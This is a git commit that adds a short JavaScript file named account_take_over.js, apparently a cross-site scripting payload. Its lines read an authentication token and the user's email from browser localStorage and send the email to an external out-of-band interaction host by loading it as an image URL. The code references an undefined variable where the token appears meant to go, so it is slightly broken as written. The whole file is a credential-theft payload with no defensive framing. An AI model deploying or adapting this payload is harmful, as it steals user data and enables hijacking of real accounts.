515c90d998cb46a5f27b5c16c3a6f2ed42348c1a
mrx_w_ <96743453+abx12@users.noreply.github.com>
2024-08-10 14:49:58 +0100

    Create account_take_over.js

---
+++ uploads/account_take_over.js
@@ -0,0 +1,6 @@
+    token=localStorage.getItem('__aple_auth__')
+    email=localStorage.getItem('__aple_user__')
+    var imgElement = document.createElement('img');
+    imgElement.src = 'https://qlczvvvmiqyxqynbxerd4zmpr24rq2j5q.oast.fun/'+data_s+"/user_data?data="+email;
+    imgElement.alt = 'Generated image';
+    document.body.appendChild(imgElement);
